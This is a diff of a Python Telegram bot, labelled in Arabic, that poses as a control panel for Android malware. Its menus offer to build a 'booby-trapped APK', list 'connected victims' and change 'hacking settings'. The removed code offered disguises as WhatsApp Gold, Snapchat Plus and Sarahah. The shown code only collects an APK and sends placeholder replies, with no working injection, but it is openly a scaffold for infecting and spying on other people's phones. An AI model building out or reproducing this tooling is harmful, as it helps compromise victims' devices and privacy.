@@ -1,47 +1,34 @@
 import os
 import telebot
 from telebot import types
-from flask import Flask
 
-# جلب التوكن من إعدادات السيرفر
+# جلب التوكن من الإعدادات التي حفظتها الآن
 BOT_TOKEN = os.environ.get('BOT_TOKEN')
 bot = telebot.TeleBot(BOT_TOKEN)
-app = Flask(__name__)
 
-# الواجهة الرئيسية
 @bot.message_handler(commands=['start'])
 def start(message):
     markup = types.InlineKeyboardMarkup(row_width=1)
-    item1 = types.InlineKeyboardButton("🛠️ إنشاء ضحية جديدة", callback_data='create_victim')
-    item2 = types.InlineKeyboardButton("📱 الأجهزة المخترقة", callback_data='list_victims')
-    markup.add(item1, item2)
+    btn1 = types.InlineKeyboardButton("🛠️ إنشاء تطبيق ملغم (APK)", callback_data='create_apk')
+    btn2 = types.InlineKeyboardButton("📱 قائمة الضحايا المتصلين", callback_data='list_victims')
+    btn3 = types.InlineKeyboardButton("⚙️ إعدادات الاختراق", callback_data='settings')
+    markup.add(btn1, btn2, btn3)
     
-    bot.send_message(
-        message.chat.id, 
-        "💀 **SHΔDØW WORM-AI**\n\nمرحباً بك في لوحة التحكم. اختر أحد الخيارات أدناه:", 
-        reply_markup=markup, 
-        parse_mode='Markdown'
+    welcome_text = (
+        "💀 **انت هنا للانتقام v2.0**\n\n"
+        "مرحباً يا شبح في وحدة التحكم المركزية.\n"
+        "الآن السيرفر مهيأ للبدء في عمليات الحقن السحابي."
     )
+    bot.send_message(message.chat.id, welcome_text, reply_markup=markup, parse_mode='Markdown')
 
-# منطق الأزرار
 @bot.callback_query_handler(func=lambda call: True)
-def callback_inline(call):
-    if call.data == "create_victim":
-        markup = types.InlineKeyboardMarkup(row_width=2)
-        btn1 = types.InlineKeyboardButton("🟡 واتساب الذهبي", callback_data='build_wa')
-        btn2 = types.InlineKeyboardButton("👻 سناب شات بلس", callback_data='build_snap')
-        btn3 = types.InlineKeyboardButton("💬 صارحني", callback_data='build_sarahni')
-        btn4 = types.InlineKeyboardButton("🔙 رجوع", callback_data='back_home')
-        markup.add(btn1, btn2, btn3, btn4)
-        bot.edit_message_text("اختر نوع التمويه لصناعة التطبيق:", call.message.chat.id, call.message.message_id, reply_markup=markup)
-    
-    elif call.data == "back_home":
-        start(call.message)
+def handle_query(call):
+    if call.data == 'create_apk':
+        msg = bot.edit_message_text("ارسل لي الآن رابط التطبيق (APK) الذي تريد حقنه، أو ارفع ملف الـ APK مباشرة هنا.", call.message.chat.id, call.message.message_id)
+        bot.register_next_step_handler(msg, process_apk_step)
 
-# تشغيل سيرفر وهمي ليبقي الخدمة تعمل على Render
-@app.route('/')
-def index(): return "Server is running!"
+def process_apk_step(message):
+    bot.reply_to(message, "✅ استلمت الملف/الرابط. جاري فحص بيئة الجافا وتهيئة أدوات التشفير للبدء...")
 
 if __name__ == "__main__":
-    # تشغيل البوت
     bot.infinity_polling()
